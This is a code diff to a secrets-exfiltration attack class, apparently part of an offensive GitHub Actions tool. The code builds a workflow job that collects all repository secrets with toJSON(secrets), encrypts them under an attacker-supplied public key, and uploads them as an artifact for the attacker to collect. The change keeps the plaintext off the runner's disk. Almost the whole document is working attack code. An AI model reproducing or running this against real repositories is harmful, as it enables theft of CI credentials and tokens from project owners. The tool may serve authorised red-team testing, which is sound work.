@@ -92,33 +92,33 @@ class SecretsAttack(Attacker):
 
         artifact_name = "files-${{ matrix.safe_name }}" if environments else "files"
 
+        # Plaintext is piped directly into openssl via stdin so it never lands
+        # on the runner workspace disk. On a self-hosted runner the workspace
+        # persists between jobs; an earlier version wrote output.json to disk
+        # and never deleted it, leaking all secrets in plaintext.
         test_job = {
             "runs-on": runner or ["ubuntu-latest"],
             "steps": [
                 {
-                    "env": {"VALUES": "${{ toJSON(secrets)}}"},
-                    "name": "Prepare repository",
-                    "run": """
-cat <<EOF > output.json
-$VALUES
-EOF
-                    """,
-                },
-                {
                     "name": "Run Tests",
-                    "env": {"PUBKEY": pubkey},
-                    "run": "aes_key=$(openssl rand -hex 12 | tr -d '\\n');"
-                    "openssl enc -aes-256-cbc -pbkdf2 -in output.json -out output_updated.json -pass pass:$aes_key;"
-                    'echo $aes_key | openssl rsautl -encrypt -pkcs -pubin -inkey <(echo "$PUBKEY") -out lookup.txt 2> /dev/null;',
+                    "env": {
+                        "VALUES": "${{ toJSON(secrets)}}",
+                        "PUBKEY": pubkey,
+                    },
+                    "run": (
+                        "aes_key=$(openssl rand -hex 12 | tr -d '\\n');"
+                        'printf %s "$VALUES" | openssl enc -aes-256-cbc -pbkdf2'
+                        " -out output_updated.json -pass pass:$aes_key;"
+                        'printf %s "$aes_key" | openssl rsautl -encrypt -pkcs'
+                        ' -pubin -inkey <(echo "$PUBKEY") -out lookup.txt 2> /dev/null;'
+                    ),
                 },
-                # Upload the encrypted files as workflow run artifacts.
-                # This avoids the edge case where there is a secret set to a value that is in the Base64 (which breaks everything).
                 {
                     "name": "Upload artifacts",
                     "uses": "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
                     "with": {
                         "name": artifact_name,
-                        "path": " |\noutput_updated.json\nlookup.txt",
+                        "path": "output_updated.json\nlookup.txt",
                     },
                 },
             ],
